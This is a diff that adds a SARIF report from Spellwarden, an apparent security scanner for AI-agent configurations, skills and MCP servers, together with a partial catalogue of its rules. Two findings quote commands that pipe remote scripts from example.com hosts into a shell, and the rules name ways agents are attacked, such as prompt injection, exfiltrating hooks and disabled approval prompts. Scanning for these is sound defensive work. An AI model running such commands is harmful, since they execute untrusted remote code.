@@ -1,0 +1,1494 @@
+{
+  "$schema": "https://docs.oasis-open.org/sarif/sarif/v2.1.0/errata01/os/schemas/sarif-schema-2.1.0.json",
+  "runs": [
+    {
+      "results": [
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".claude/settings.json"
+                },
+                "region": {
+                  "startLine": 4
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Hook pipes remote content to a shell: PostToolUse: curl -s https://hooks.example.com/notify | sh"
+          },
+          "partialFingerprints": {
+            "spellwarden/v1": "acd003db002fd80ea6e60d3701027262896b10a940830e32030e0486ccd6eab6"
+          },
+          "ruleId": "SW-CFG-005",
+          "ruleIndex": 23
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".claude/skills/deploy/scripts/setup.sh"
+                },
+                "region": {
+                  "startLine": 2
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Remote script piped to a shell: curl -fsSL https://get.example.com/install.sh | sh"
+          },
+          "partialFingerprints": {
+            "spellwarden/v1": "a69b2dc6be1abcc13eabe70d22b6781e5d2b39327564950666f795ad328fcf5d"
+          },
+          "ruleId": "SW-SKL-007",
+          "ruleIndex": 51
+        },
+        {
+          "level": "warning",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".well-known/agent-card.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Agent card uses a format older than A2A 1.0: /: card format 0.3"
+          },
+          "partialFingerprints": {
+            "spellwarden/v1": "ea0990d757ec0ca58d90ada3f1bc80e10b442ed5a5c61f2501458462d926fd91"
+          },
+          "ruleId": "SW-A2A-002",
+          "ruleIndex": 1
+        },
+        {
+          "level": "warning",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".mcp.json"
+                },
+                "region": {
+                  "startLine": 3
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "MCP server launched from an unpinned package: files: npx @modelcontextprotocol/server-filesystem"
+          },
+          "partialFingerprints": {
+            "spellwarden/v1": "eaa20732b321eae1abaaeeea259d0ab70a565f877d53663695c0e01b18bcf1a3"
+          },
+          "ruleId": "SW-CFG-003",
+          "ruleIndex": 21
+        },
+        {
+          "level": "warning",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".claude-plugin/marketplace.json"
+                },
+                "region": {
+                  "startLine": 4
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Marketplace plugin source not pinned to a commit: lint: github:example/lint-plugin (no declared commit pin)"
+          },
+          "partialFingerprints": {
+            "spellwarden/v1": "51bf67a926747f18400b2914d7d2a42b47c65a95f515a0029a7e93ea959b5926"
+          },
+          "ruleId": "SW-CFG-009",
+          "ruleIndex": 27,
+          "suppressions": [
+            {
+              "justification": "The lint plugin is reviewed at every release of the marketplace.",
+              "kind": "external"
+            }
+          ]
+        },
+        {
+          "level": "note",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".well-known/agent-card.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Agent card is not signed: /: the card carries no signature"
+          },
+          "partialFingerprints": {
+            "spellwarden/v1": "6464756775a40dbdbb62d2448955aad69f91eb0ce6f9b7029e0fb7c350a50627"
+          },
+          "ruleId": "SW-A2A-012",
+          "ruleIndex": 11
+        }
+      ],
+      "tool": {
+        "driver": {
+          "informationUri": "https://github.com/spellwarden-ai/spellwarden",
+          "name": "Spellwarden",
+          "rules": [
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-001",
+              "name": "AgentCardDoesNotFollowA2A10",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-10"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card does not follow A2A 1.0"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-002",
+              "name": "AgentCardUsesAFormatOlderThanA2A10",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-10"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card uses a format older than A2A 1.0"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-003",
+              "name": "AgentCardAtThePathUsedBeforeA2A03",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-10"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card at the path used before A2A 0.3"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-004",
+              "name": "AgentEndpointOrAuthenticationURLNotServedOverHTTPS",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SC-8"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent endpoint or authentication URL not served over HTTPS"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-005",
+              "name": "OAuthImplicitOrPasswordFlowDeclaredDeprecatedInA2A10",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI03",
+                  "IA-5"
+                ]
+              },
+              "shortDescription": {
+                "text": "OAuth implicit or password flow declared (deprecated in A2A 1.0)"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-006",
+              "name": "OAuthAuthorizationCodeFlowWithoutPKCERequired",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI03",
+                  "IA-5"
+                ]
+              },
+              "shortDescription": {
+                "text": "OAuth authorization code flow without PKCE required"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-007",
+              "name": "AgentDeclaresNoAuthentication",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI03",
+                  "AC-3",
+                  "AML.T0132"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent declares no authentication"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-008",
+              "name": "APIKeySentInTheURLQuery",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI03",
+                  "IA-5",
+                  "AML.T0055"
+                ]
+              },
+              "shortDescription": {
+                "text": "API key sent in the URL query"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-009",
+              "name": "SkillInheritsEveryScopeOfTheAgent",
+              "properties": {
+                "security-severity": "3.0",
+                "tags": [
+                  "security",
+                  "ASI03",
+                  "AC-6"
+                ]
+              },
+              "shortDescription": {
+                "text": "Skill inherits every scope of the agent"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-010",
+              "name": "AgentCardSignatureDoesNotVerify",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-7",
+                  "AML.T0074"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card signature does not verify"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-011",
+              "name": "AgentCardSignatureIsMalformedOrUsesARefusedAlgorithm",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-7",
+                  "AML.T0074"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card signature is malformed or uses a refused algorithm"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-012",
+              "name": "AgentCardIsNotSigned",
+              "properties": {
+                "security-severity": "3.0",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-7",
+                  "AML.T0074"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card is not signed"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-013",
+              "name": "SigningKeyNotBoundToTheCardSHost",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-7",
+                  "AML.T0074"
+                ]
+              },
+              "shortDescription": {
+                "text": "Signing key not bound to the card's host"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-014",
+              "name": "AgentCardTextContainsInjectedInstructionsOrHiddenCharacters",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI01",
+                  "SI-10",
+                  "AML.T0051.001",
+                  "AML.T0110.000"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card text contains injected instructions or hidden characters"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-015",
+              "name": "CredentialInTheAgentCard",
+              "properties": {
+                "security-severity": "9.5",
+                "tags": [
+                  "security",
+                  "ASI03",
+                  "IA-5",
+                  "AML.T0055"
+                ]
+              },
+              "shortDescription": {
+                "text": "Credential in the agent card"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-016",
+              "name": "AgentCardFetchedThroughARedirectToAnotherHost",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SC-8",
+                  "AML.T0074"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card fetched through a redirect to another host"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-017",
+              "name": "AgentCardSignedWithASharedSecretThatOnlyTheAgentCanCheck",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-7",
+                  "AML.T0074"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card signed with a shared secret that only the agent can check"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-018",
+              "name": "AgentCardCannotBeRead",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-10"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card cannot be read"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-A2A-019",
+              "name": "AgentCardMemberSpelledTwoWays",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-10"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card member spelled two ways"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-CFG-001",
+              "name": "RemoteMCPServerOverPlainHTTP",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "SC-7"
+                ]
+              },
+              "shortDescription": {
+                "text": "Remote MCP server over plain HTTP"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-CFG-002",
+              "name": "CredentialWrittenIntoAnMCPServerConfiguration",
+              "properties": {
+                "security-severity": "9.5",
+                "tags": [
+                  "security",
+                  "MCP01",
+                  "MCP07",
+                  "IA-5",
+                  "AML.T0055",
+                  "AML.T0083"
+                ]
+              },
+              "shortDescription": {
+                "text": "Credential written into an MCP server configuration"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-CFG-003",
+              "name": "MCPServerLaunchedFromAnUnpinnedPackage",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "MCP04",
+                  "SR-3",
+                  "AML.T0010.005",
+                  "AST02",
+                  "AST07"
+                ]
+              },
+              "shortDescription": {
+                "text": "MCP server launched from an unpinned package"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-CFG-004",
+              "name": "MCPServerAtARawIPAddressOrBehindAURLShortener",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI10",
+                  "SC-7",
+                  "AML.T0010.005"
+                ]
+              },
+              "shortDescription": {
+                "text": "MCP server at a raw IP address or behind a URL shortener"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-CFG-005",
+              "name": "HookPipesRemoteContentToAShell",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AML.T0142"
+                ]
+              },
+              "shortDescription": {
+                "text": "Hook pipes remote content to a shell"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-CFG-006",
+              "name": "HookSendsLocalFileContentsToAnExternalHost",
+              "properties": {
+                "security-severity": "9.5",
+                "tags": [
+                  "security",
+                  "ASI10",
+                  "SC-7",
+                  "AML.T0142",
+                  "AML.T0086"
+                ]
+              },
+              "shortDescription": {
+                "text": "Hook sends local file contents to an external host"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-CFG-007",
+              "name": "HookDecodesAndRunsAnEncodedPayload",
+              "properties": {
+                "security-severity": "9.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AML.T0142",
+                  "AML.T0011.001"
+                ]
+              },
+              "shortDescription": {
+                "text": "Hook decodes and runs an encoded payload"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-CFG-008",
+              "name": "SettingsSwitchOffApprovalPrompts",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI10",
+                  "AC-6",
+                  "AML.T0081"
+                ]
+              },
+              "shortDescription": {
+                "text": "Settings switch off approval prompts"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-CFG-009",
+              "name": "MarketplacePluginSourceNotPinnedToACommit",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "MCP04",
+                  "SR-3",
+                  "AML.T0010.005",
+                  "AML.T0109",
+                  "AST02",
+                  "AST07"
+                ]
+              },
+              "shortDescription": {
+                "text": "Marketplace plugin source not pinned to a commit"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-CFG-010",
+              "name": "LiteralValueUnderASecretNameInAnMCPServerConfiguration",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "MCP01",
+                  "MCP07",
+                  "IA-5",
+                  "AML.T0083"
+                ]
+              },
+              "shortDescription": {
+                "text": "Literal value under a secret name in an MCP server configuration"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-CFG-012",
+              "name": "MCPServerConfiguredToApproveEveryToolCallAutomatically",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI02",
+                  "AC-6",
+                  "CM-7",
+                  "AML.T0053"
+                ]
+              },
+              "shortDescription": {
+                "text": "MCP server configured to approve every tool call automatically"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-CFG-013",
+              "name": "DatabaseOrClusterMCPServerWithWriteAccessAlthoughAReadOnlyModeExists",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI03",
+                  "MCP02",
+                  "AC-3",
+                  "AC-6",
+                  "AML.T0053"
+                ]
+              },
+              "shortDescription": {
+                "text": "Database or cluster MCP server with write access although a read-only mode exists"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-MCP-001",
+              "name": "ServerListsToolsWithoutAuthentication",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "MCP07",
+                  "AC-3",
+                  "AML.T0084.001",
+                  "AML.T0132"
+                ]
+              },
+              "shortDescription": {
+                "text": "Server lists tools without authentication"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-MCP-002",
+              "name": "StaticKeyAuthenticationInsteadOfOAuth",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "MCP01",
+                  "MCP07",
+                  "IA-5"
+                ]
+              },
+              "shortDescription": {
+                "text": "Static key authentication instead of OAuth"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-MCP-003",
+              "name": "OAuthDynamicClientRegistrationDeprecatedUseClientIDMetadataDocuments",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "MCP07",
+                  "IA-5"
+                ]
+              },
+              "shortDescription": {
+                "text": "OAuth dynamic client registration (deprecated; use Client ID Metadata Documents)"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-MCP-004",
+              "name": "HTTPSSETransportDeprecated",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3"
+                ]
+              },
+              "shortDescription": {
+                "text": "HTTP+SSE transport (deprecated)"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-MCP-005",
+              "name": "SpecVersionOlderThan20260728",
+              "properties": {
+                "security-severity": "3.0",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3"
+                ]
+              },
+              "shortDescription": {
+                "text": "Spec version older than 2026-07-28"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-MCP-006",
+              "name": "ProtocolSessionsMcpSessionIdInUse",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3"
+                ]
+              },
+              "shortDescription": {
+                "text": "Protocol sessions (Mcp-Session-Id) in use"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-MCP-007",
+              "name": "RequiresTheInitializeHandshakeNoServerDiscover",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3"
+                ]
+              },
+              "shortDescription": {
+                "text": "Requires the initialize handshake; no server/discover"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-MCP-008",
+              "name": "UsesDeprecatedRootsSamplingOrLogging",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3"
+                ]
+              },
+              "shortDescription": {
+                "text": "Uses deprecated Roots, Sampling or Logging"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-MCP-009",
+              "name": "EndpointNotServedOverHTTPS",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "SC-7"
+                ]
+              },
+              "shortDescription": {
+                "text": "Endpoint not served over HTTPS"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-MCP-010",
+              "name": "NoProtectedResourceMetadataOrIssuerNotValidated",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "MCP07",
+                  "IA-5"
+                ]
+              },
+              "shortDescription": {
+                "text": "No protected resource metadata, or issuer not validated"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-MCP-011",
+              "name": "MCPServerTextContainsInstructionLikeText",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI01",
+                  "MCP03",
+                  "SI-10",
+                  "AML.T0110.000",
+                  "AML.T0051.001"
+                ]
+              },
+              "shortDescription": {
+                "text": "MCP server text contains instruction-like text"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-REG-001",
+              "name": "SkillPackageNotAdmittedInTheOrganisationSPrivateRegistry",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AML.T0010.005",
+                  "AST09"
+                ]
+              },
+              "shortDescription": {
+                "text": "Skill package not admitted in the organisation's private registry"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-REG-002",
+              "name": "MCPServerNotAdmittedInTheOrganisationSPrivateRegistry",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "MCP09",
+                  "SR-3",
+                  "AML.T0010.005",
+                  "AST09"
+                ]
+              },
+              "shortDescription": {
+                "text": "MCP server not admitted in the organisation's private registry"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-REG-003",
+              "name": "AgentContentThePrivateRegistryCannotJudge",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AML.T0010.005",
+                  "AST09"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent content the private registry cannot judge"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-001",
+              "name": "PromptInjectionPhrasesInSkillInstructions",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI01",
+                  "SI-10",
+                  "AML.T0051.001",
+                  "AML.T0110.000",
+                  "AST05"
+                ]
+              },
+              "shortDescription": {
+                "text": "Prompt-injection phrases in skill instructions"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-002",
+              "name": "HiddenTextZeroWidthOrBidirectionalControlCharacters",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI01",
+                  "SI-10",
+                  "AML.T0068",
+                  "AML.T0110.000",
+                  "AST05"
+                ]
+              },
+              "shortDescription": {
+                "text": "Hidden text: zero-width or bidirectional control characters"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-003",
+              "name": "InstructionsToSkipApprovalsOrDisableHooks",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI10",
+                  "AC-6",
+                  "AML.T0081",
+                  "AST03"
+                ]
+              },
+              "shortDescription": {
+                "text": "Instructions to skip approvals or disable hooks"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-004",
+              "name": "EncodedPayloadDecodedAndExecuted",
+              "properties": {
+                "security-severity": "9.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AML.T0011.002",
+                  "AST01"
+                ]
+              },
+              "shortDescription": {
+                "text": "Encoded payload decoded and executed"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-005",
+              "name": "WritesToAgentConfiguration",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI10",
+                  "AC-6",
+                  "AML.T0081",
+                  "AST03"
+                ]
+              },
+              "shortDescription": {
+                "text": "Writes to agent configuration"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-006",
+              "name": "DestructiveCommandWithoutAConfirmationStep",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI10",
+                  "AC-6",
+                  "AML.T0101"
+                ]
+              },
+              "shortDescription": {
+                "text": "Destructive command without a confirmation step"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-007",
+              "name": "RemoteScriptPipedToAShell",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "MCP04",
+                  "SR-3",
+                  "AML.T0010.005",
+                  "AST02"
+                ]
+              },
+              "shortDescription": {
+                "text": "Remote script piped to a shell"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-008",
+              "name": "SendsLocalFileContentsToAnExternalHost",
+              "properties": {
+                "security-severity": "9.5",
+                "tags": [
+                  "security",
+                  "ASI10",
+                  "SC-7",
+                  "AML.T0086",
+                  "AML.T0037",
+                  "AST01"
+                ]
+              },
+              "shortDescription": {
+                "text": "Sends local file contents to an external host"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-009",
+              "name": "UnpinnedDependencyInstall",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "MCP04",
+                  "SR-3",
+                  "AML.T0010.005",
+                  "AST02",
+                  "AST07"
+                ]
+              },
+              "shortDescription": {
+                "text": "Unpinned dependency install"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-010",
+              "name": "BundledBinaryOrExecutableFile",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AML.T0011.001",
+                  "AST02"
+                ]
+              },
+              "shortDescription": {
+                "text": "Bundled binary or executable file"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://github.com/spellwarden-ai/spellwarden#the-rules",
+              "id": "SW-SKL-011",
+              "name": "HardCodedCredentialInThePackage",
+              "properties": {
+                "security-severity": "9.5",
+                "tags": [
+                  "security",
+                  "MCP01",
+                  "IA-5",
+                  "AML.T0055"
+                ]
+              },
+              "shortDescription": {
